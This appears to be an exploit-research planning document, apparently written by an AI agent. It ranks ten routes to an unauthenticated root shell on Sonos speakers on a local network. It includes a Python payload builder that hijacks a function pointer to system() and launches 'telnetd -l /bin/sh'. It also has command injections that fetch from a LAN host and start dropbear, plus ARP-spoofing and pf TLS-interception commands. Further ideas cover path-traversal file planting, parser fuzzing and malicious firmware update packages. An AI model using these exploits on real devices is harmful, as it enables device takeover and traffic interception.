# WIZARD_IDEAS_GLM — 10 ways to an interactive root shell (ranked)

Ground truth: pre-auth root-level FN execution is PROVEN on all three units
(PPC .84/.202 via dispatcher 0x102bf778 with **r3=B at the FN call**; S2 .135
via the FN-jump, though `0x4ab64c`'s system() takes a0 from its literal pool).
The per-unit BSU chain delivers full 5.6 MB fetches as root but the install
verdict is invisible. Constraints honored throughout: per-unit LAN only, no
network-wide DNS, no eero changes, no serial.

---

## 1. PPC arg control is already proven — fire `system@plt` itself (r3=B)

**The play.** The dispatcher passes **r3 = B (pointer at node200)** into every
FN call — that's in the decode (`ROOT_SWARM_STATE.md` chain: `[A+8]→B; [B]=V;
FN=[V+28]`), and the chain constrains only node200's first dword (`[B]=V`).
Nobody has fired FN = `system@plt` = **0x105464B0** directly. The PLT stub is
`lw/mtctr/bctr` — it does not touch r3. So `system(<string at node200>)`
executes with our bytes. The only constraint: node200[0..3] = `&node600`, a
heap pointer like `0x106c5068` → big-endian bytes `10 6c 50 68`, all
NUL-free → the string starts with 4 junk bytes. Classic fix: **`;` prefix** —
`sh -c "\x10\x6cPH;/usr/sbin/telnetd -p 2323 -l /bin/sh"` runs junk (not
found), then our command. Choose S so `(S+600) & 0xff != 0` (and no interior
0x00) — the band scan already sweeps S per fire.

**Why it should win.** Every ingredient is device-proven: the FN jump (8+
reboots), the r3=B wiring (decode + emu walk), system() reachability from the
notify thread (the reboot gadget is a system() call in the same thread), and
telnetd exists in the 57.23 rootfs. One payload, one fire, and telnetd
**daemonizes** — system() returns fast, the notify thread resumes, no
watchdog reboot, unit stays up with a listener. This also silently retires
the whole "argv = notify ctx" falsification (that was the `execve` wrapper
0x104044C0, not system()).

**First command:**
```bash
cd /Users/jemanuel/projects/frankensonos && python3 - <<'EOF'
import struct
# reuse the PPC builder layout: B=node200, V=node600, FN at [V+28]=node628
S=0x106c4e10                      # re-calibrate band first (canary sweep)
b=bytearray(24000)
cmd=b";/usr/sbin/telnetd -p 2323 -l /bin/sh\x00"
assert (S+600).to_bytes(4,'big').count(0)==0, "pick S with NUL-free &node600"
b[200+4:200+4+len(cmd)]=cmd       # node200+4.. = free after [B]=V dword
struct.pack_into(">I",b,200,  S+600)          # [B]=V
struct.pack_into(">I",b,628,  0x105464B0)     # FN = system@plt
struct.pack_into(">I",b,100+8,S+200)          # [A+8]=B, A=node100
struct.pack_into(">I",b,6404, S+100)          # observer cell ->A
open("recon/tnzm_audible/sweep/SYSPLT_%06x.aa"%(S&0xffffff),"wb").write(bytes(b))
print("wrote payload; fire with the standard stage1+stage2 volley")
EOF
```
(Then fire with the existing .84 runner — same two-stage stage1-rebind
discipline as the reboot-gadget fires.)

**Expected observable.** `nc -z 192.168.4.84 2323` → **open** = interactive
shell as root (`telnetd -l /bin/sh`), unit stays up. Branches: no listener +
no crash → r3≠B live (go to idea 8 for the offline register dump); crash →
r3 is a live but wrong pointer (same pivot); listener + later reboot →
telnetd died, check with `-p 2323` vs busybox arg order.

**Risk/falsifier.** r3-at-call was decode/emu-derived, never live-exercised
(the reboot gadget was deliberately r3-independent). One fire falsifies or
confirms. Cost: an evening.

---

## 2. S2: same trick — `system@plt` (0x6DCEA0) or a mid-function jump past the literal-pool load

**The play.** Two S2 variants of idea 1:
- (a) FN = S2 `system@plt` = **0x6DCEA0** (the corrected stub — the old
  0x6DCE50 is `kill@`). The S2 dispatcher's a0-at-entry is the open question
  after the killall correction; if it points at node0 (the original matrix
  layout), `system(node0)` executes our 107-byte cmd directly.
- (b) FN = the address of the `jal system@mips16plt` **inside** 0x4ab64c's
  handler (MIPS16 target, odd address), skipping the `lw a0, =0x676608`
  literal load. If a0 is not clobbered between function entry and that jal,
  the call executes `system(<entry-a0>)` — again our string if entry-a0=node0.

**Discriminator A/B (the 'true' test done right this time):** fire with
node0 = `;wget -O /dev/null http://192.168.4.160:8985/S2ARG` — an HTTP hit on
our server is unambiguous arg-control proof (the old `true` A/B was invalid:
it exercised the killall path). Follow immediately with the one-fire shell:
`;dropbearkey -t ecdsa -f /jffs/k -s 256;dropbear -r /jffs/k -p 2323` (71 B,
fits the 107-byte node0 budget; dropbear daemonizes → fast system() return →
no watchdog trip).

**First command:**
```bash
objdump -m mips:16 -d --start-address=0x4ab600 --stop-address=0x4ab700 \
  captures/firmware/s2_overlay/bin/anacapad | sed -n '1,80p'
```
Read the entry→jal region: note every write to a0 (r4) and the exact jal
address. If a0 is dead between entry and jal → variant (b) is live; if the
dispatcher's a0 setup is visible in the caller, variant (a) may work with zero
mid-function risk.

**Expected observable.** Variant (a/b) fire → HTTP beacon hit = arg control;
then the dropbear one-liner → `nc -z 192.168.4.135 2323` open = **S2 shell**,
which un-blocks the entire matrix bead and the persistence kit.

**Risk/falsifier.** If entry-a0 ≠ node0 (e.g., a0 = the observer struct), both
variants produce system(garbage) → ENOENT no-op or SIGSEGV (crash-restart
<1 s — use the 0.2 s-poll cadence from the oracle-cadence lesson, not 1 s
polls). Either outcome sharpens the model; the decode in step one decides
before any fire.

---

## 3. Per-unit gateway hijack → TLS intercept → native MinVersion arming (the DNS-flip without the DNS flip)

**The play.** The arming predicate (settings fetch → `downgradeMinVersion` →
`FUN_1029c34c` writes `MinVersion:` into `/var/run/upgradeinfo`) is the
*natively-written* version of the LF-injection that the daemon's templater
wipes ("inert in practice: the writer templates every key afterwards"). The
owner blocked network-wide DNS — but a **per-unit L2 hijack from this Mac is
neither DNS nor eero**: ARP-spoof (or ICMP-redirect) only .84/.202 so their
default gateway becomes 192.168.4.160; pf forwards + redirects only
`tcp from <unit> to any port 443 → 127.0.0.1:8643`. The unit's real
system-api.sonos.com TLS session lands on our responder, which already
presents the eMudhra chain that **verified OK against the device bundle
root** (2026-11-03), serving `settings_forge.py`'s dual-shape policy. Arming
fires natively; then the proven per-unit BSU delivers pwned-65130.upd with
the downgrade gate satisfied by a MinVersion the daemon itself wrote.

**Why here.** It converts the entire staged q57 chain (forge + responder +
launchd persistence + decode, all done) from "waiting on the owner's router"
to "run it from this Mac today", and it's reversible in seconds
(`arp -d`, sysctl off, pfctl -d).

**First command:**
```bash
python3 -c 'import scapy.all; print("scapy ok")' 2>/dev/null \
  || pip3 install --user scapy; \
sudo sysctl -w net.inet.ip.forwarding=1 && \
sudo pfctl -f /dev/stdin <<'EOF'
pass on en0
rdr pass on en0 proto tcp from 192.168.4.84 to any port 443 -> 192.168.4.160 port 8643
EOF
```
then run a scapy ARP spoofer for .84↔192.168.4.1 (bidirectional, 2 s period)
and watch `recon/q57/launchd` responder's requests.log for the settings HIT.

**Expected observable.** requests.log gains a `GET /product-settings/v3/settings`
from .84 (SNI system-api.sonos.com) → serve the forge → then
`curl http://192.168.4.84:1400/status/upgradeinfo` (post-BSU) shows the
**native** URL+MinVersion lines → fire BSU with pwned-65130 → install reboot
into 57.22-65130.

**Risk/falsifier.** ARP spoofing on the owner's LAN: scope to one bench unit,
keep the kill switch ready, and never spoof .135 while another agent uses it.
If the unit hard-pins its ARP or ignores redirects, fall back to ICMP-redirect
(Linux-based stacks usually honor them). If the settings job only runs on the
deferred-shutdown path (kr9e's open question), idle the unit or force the
deferred path — the intercept itself is orthogonal.

---

## 4. Fuzz the pre-signature parse surfaces (type-21/type-1) in the existing chroot harness — root exec with NO verdict gate

**The play.** `UPDATE_FEED_AND_SIGNATURE.md` states it verbatim: the type-1
and type-21 records and the type-22 header "are parsed with no key...
**type-21 is plaintext and completely unfuzzed so far**". The units already
fully fetch and header-parse our packages before any verdict (the fetch is
proven; the downgrade refusal happens *after* parsing). A parser bug in
type-21/22 handling = root code execution inside the updater during the
BSU we already fire — bypassing the MinVersion/deferred mystery entirely.
The offline harness on css (real 57.23/65130 `upgrade` binary, chroot +
qemu-ppc) is the oracle: structure-aware mutations of the type-21 series list
(lengths, entry counts, string termination, the 128 KiB reassembly boundary),
run overnight, catch crashes/hangs.

**First command:**
```bash
ssh css 'ls /opt /root 2>/dev/null | head -30; ls -d /opt/*chroot* /opt/*65130* /root/*57* 2>/dev/null'
```
(locates the harness; then generate 1k type-21 mutations of pwned-65130.upd
with a small script preserving the signed prefix byte-identical, and replay
each through the chroot runner.)

**Expected observable.** Any harness crash/abort/timeout on a mutant = a
candidate; reproduce, minimize, then craft pwned-nodns.upd + trigger and fire
per-unit BSU. A device-side hit = root exec in the updater context, which can
write Configure.dev, the unlock flag, and spawn telnetd directly.

**Risk/falsifier.** The parser may be boring (it survived the trailing-record
probes). The 128 KB per-record reassembly ceiling is the most promising fault
edge (a type-21 near the boundary). Cost: one css night-cycle; no device time
until a candidate exists.

---

## 5. Upgrade instead of downgrade: check the live feed for a genuine package NEWER than installed, then ride the malleable trailing type-3

**The play.** The .84/.202 refusal is (per session 11) the
MinVersion/deferred/downgrade decision. An **upgrade** path needs none of it.
If Sonos has shipped any S1 build > 57.23-74170 or S2 build > 86.10-81100
since, fetch the genuine .upd from the public CDN (no auth), append our
trailing type-3 preinstall, and serve per-unit via the proven BSU. No
downgrade-blocked(9), no MinVersion, no arming. The companion fact: the
genuine type-3 must be **encrypted to the model key** (plaintext type-3 never
executes; the extracted 86.10-80260 tree ships `preinstall.sh` + the blob
format — "trailing 12 bytes as IV XORed with a per-blob tag"), and we hold
the model-12/16 keys, so a properly-cloned encrypted trailing type-3 is
buildable today. This also answers the standing "does the flasher honor a
trailing type-3/4" question with the cleanest possible experiment.

**First command:**
```bash
grep -rn "update.sonos\|UpgradeURL\|\.upd HTTP\|feed" docs/UPDATE_FEED_AND_SIGNATURE.md docs/ROOT_SWARM_STATE.md | grep -i "http" | head -8
```
→ resolve the feed/CDN URL, `curl` the current-feed XML for S1 and S2 model
entries, and compare against 57.23-74170 / 86.10-81100.

**Expected observable.** A newer version string in the feed → download, verify
`verify_upd.py` PASS after appending the encrypted type-3, BSU fire → the
unit **reboots into the new version** (definitive install) → on next boot
`/etc/Configure` sources `/jffs/system/Configure.dev` (57.23 line 87-88) →
telnetd 2323.

**Risk/falsifier.** If the feed still serves 57.23-74170/86.10-81100 as
current, this dies — but the check is 10 minutes. If the flasher ignores
trailing type-3 even encrypted, the unit still upgrades (information: the
preinstall lane needs the replacement-path work instead).

---

## 6. Read the observable we already own: does `/status/upgradeinfo` show the MinVersion line at all?

**The play.** `/status/upgradeinfo` is pre-auth readable, and the entire
session-8/11 mystery branches on one unexamined fact: after the no-DNS BSU
fires that produced full fetches, **what does the unit's own upgradeinfo say
right now?** If it lacks the MinVersion line, the `&#10;` LF-injection never
survived (SOAP arg sanitation or the writer's templating) and the downgrade
verdict is fully explained — pivot to idea 3 (native arming) with proof in
hand. If it HAS URL+MinVersion, the daemon-side decision is the blocker and
the Flags/deferred matrix (idea 10) becomes the lane. 30 seconds, zero risk,
reroutes two other ideas.

**First command:**
```bash
for u in 192.168.4.84 192.168.4.202; do echo "== $u"; curl -s -m 5 "http://$u:1400/status/upgradeinfo"; echo; done
```
(Repeat immediately after a fresh BSU fire to catch the transient state.)

**Expected observable.** Empty/envelope-only → the injection is dead → idea 3
is the fix. `URL: ...` + `MinVersion: [...]` present → the daemon had what it
needed and still refused → the decision logic (deferred/Flags) is the
blocker → idea 10.

**Risk.** None; it's a GET. The only trap: reading it long after the fire may
show a post-templated state — re-read within a minute of the next BSU.

---

## 7. Decode the fetch-filename source (0x102b8e4c → 0x102b8eb8): plant Configure.dev through the PROVEN fetch itself

**The play.** The steerable `sonosFileCreate` site (name from `[r29+4]`,
caller r4) sits in a runtime-vtable pair with no static refs. If that pair is
the **update-download writer** and the name derives from our BSU URL
(basename or Content-Disposition), then the fetch we already trigger writes
attacker-named files as root — e.g. BSU URL
`http://192.168.4.160:8985/x.upd` → try a basename that traverses
(`..%2f..%2ftmp%2fdevice_unlocked_flag` or directly
`../../jffs/system/Configure.dev`), payload = the fetched bytes themselves
(we serve them). Then the proven reboot gadget → boot chain executes
Configure.dev → telnetd. No install verdict, no arming, no signature — just
the fetch we've already demonstrated 5+ times.

**First command:**
```bash
ls captures/research/ghidra-upd/*.gpr 2>/dev/null; \
ssh css 'ls /opt 2>/dev/null | head' ; \
grep -rn "102b8e4c\|102b8eb8\|102b8f28" docs/ recon/ --include=*.md | head -8
```
then Ghidra `DecFn.java` on 0x102b8e4c + find the BSS vtable construction
(write of 0x102b8e4c into a table) to identify the owning object and the
name's origin (URL basename vs header field).

**Expected observable.** Decode shows name = f(URL) → craft the traversal
BSU → reboot gadget → `nc -z 192.168.4.84 2323` after boot = shell. If the
name is a fixed `/jffs/upgrade/image.upd`, the idea dies cleanly in 20
minutes of decode.

**Risk/falsifier.** Mid-function FN-jump concerns don't apply here — this is
the *normal* code path (no FN corruption needed); the only question is where
the name comes from. The 57.23 `/etc/Configure:87-88` hook is already
device-decoded, so the boot side is certain.

---

## 8. QEMU-PPC live session dump: read r3/r4 and the notify-ctx strings at 0x102bf778 offline

**The play.** The argv circular dependency ("need the shell to dump the
notify object, need the object to build the shell") dissolves if the PPC
57.23 anacapad runs under qemu-ppc on css the way the S2 daemon runs under
qemu-mips (loader walls already solved there; the 57.23 chroot already runs
its sibling `upgrade` binary). Feed a real SetAVTransportURI + .aa over the
emulated :1400, break at the dispatcher (qemu `-g 1234` + gdb-multiarch),
and print r3, r4, and the strings behind them at the FN call. That yields:
(a) the exact live bytes of node200 (validating idea 1's `;`-prefix layout
BEFORE a device fire), (b) the notify-ctx argv contents (deciding the execve
wrapper route forever), (c) a permanent offline rehearsal rig for every
future PPC payload.

**First command:**
```bash
ssh css 'ls /opt | head; which qemu-ppc; ls /opt/*57.23* /opt/*ppc* 2>/dev/null'
```
then stage `captures/firmware/57.23-74170-1-12/anacapad` into the existing
chroot, run `qemu-ppc -g 1234 ./anacapad`, and drive :1400 from a script.

**Expected observable.** A gdb session showing r3 = a heap pointer whose
buffer we recognize (node200) → idea 1 confirmed pre-fire; the argv walk
strings dumped → the execve-wrapper route gets its live dump without a
device. If the PPC daemon hits an init wall (IPC/hw), the S2 playbook's
fixes (fake /proc, watchdog NOP patch at the equivalent site) apply
directly — the recipe is written down.

**Risk/falsifier.** Highest effort-per-probability of the top ideas, but it
de-risks every other PPC idea and is reusable. Timebox: one session; if
anacapad wedges before :1400, record the wall and fall back to idea 1's
direct fire.

---

## 9. S2 native update lane: decode what feeds `/var/run/forceupdateurl`, then let .135 fetch-and-install on its own

**The play.** The S2 handler at 0x4ab64c does `url` →
`sonosFileCreate('/var/run/forceupdateurl')` and `forceupdate` →
`/var/run/forceupdate` + the killall. If either field is request-reachable
(the handler is the *legacy recovery* path — find its normal caller: an
endpoint, a boot-time read, or an IPC message), we get a **clean named
write** of the update URL without any register control. Then the S2 daemon's
own update machinery fetches from us as root. Independently verify the S2
(86.10) verifier's prefix-hash behavior on the 80260 rootfs's `upgrade`
binary under the existing qemu-mips chroot (it reaches the hhid wall — but
the updater likely doesn't need hhid): if trailing records are unhashed
there too, the model-12-encrypted trailing type-3 rides a valid signature
exactly as on S1.

**First command:**
```bash
strings -t x captures/firmware/s2_overlay/bin/anacapad | grep -i "forceupdate" ; \
objdump -m mips:16 -d captures/firmware/s2_overlay/bin/anacapad 2>/dev/null | \
  grep -n "4ab64c\|4ab456\|656e34" | head -20
```
then trace the handler's callers (who builds the `url`/`forceupdate` fields)
in `/tmp/s2decode/full16.asm` (regenerate if the Mac rebooted).

**Expected observable.** A request-reachable write of forceupdateurl → set it
to our .upd → trigger forceupdate → .135's updater fetches (watch the
responder log) → S2 malleability verdict from the qemu oracle decides the
trailing-type-3 build.

**Risk/falsifier.** If the fields are only read at boot from flash (not
request-written), the idea collapses to "need one write first" — but the
decode is cheap and the S2 updater verification (qemu) pays off regardless.

---

## 10. The cheap exhaustive matrix: Flags 0–31 × ExtraOptions on VALID signed packages, with upgradeinfo polled after each fire

**The play.** The Flags sweep that exists (0..31 + big constants) was run to
test the *unsigned-preinstall* bypass — a different question. The install
verdict for **validly signed** packages was only probed at Flags 0/1/2/4. The
deferred-install hypothesis ("the settings-fetch job only runs on the
deferred-shutdown path") predicts some Flags bit (8/16-class) routes the
fetch into the decision path that re-reads MinVersion and installs.
Fully scripted: for each Flags value × {with, without} MinVersion
ExtraOptions × {.84, .202}: fire BSU serving pwned-65130, poll
`/status/upgradeinfo` at +5 s / +30 s / +120 s, and record version changes.
~128 fires of existing tooling, no decode, and each fire logs the exact
observable the whole campaign lacks.

**First command:**
```bash
grep -rln "BeginSoftwareUpdate" recon/ scripts/ --include=*.py | head -5
```
→ wrap the existing fire script in the matrix loop (fires are ~2 min apart;
run overnight per unit).

**Expected observable.** One cell where upgradeinfo gains the MinVersion line
AND the version changes (or a reboot into 65130) = the verdict condition,
identified from outside. Even all-negative results bound the decision logic
for the chroot replay (which then only needs the hw-set fake fixed to declare
the residual difference).

**Risk/falsifier.** Lowest information-per-fire of the list; run it as
background ballast while ideas 1–3 execute, not instead of them. Keep fires
paced to avoid the c25-class wedge (SMB timeout wedging) — one unit at a
time.

---

## If I could only run three things tomorrow morning

1. **Idea 6** (the 30-second upgradeinfo read) — it reroutes everything else.
2. **Idea 1** (PPC `system@plt` with the `;`-prefix at node200+4) — one fire
   from an interactive root shell on .84/.202 with all-proven parts.
3. **Idea 2** (S2 decode then fire) — the same shell on .135, which un-blocks
   the matrix bead, the persistence kit, and the firmware chain.

Ideas 3–5 are the strategic reserve: they attack the verdict from the
arming side (3), the parser side (4), and the version side (5) — any one of
them converts the proven fetch into a proven install.
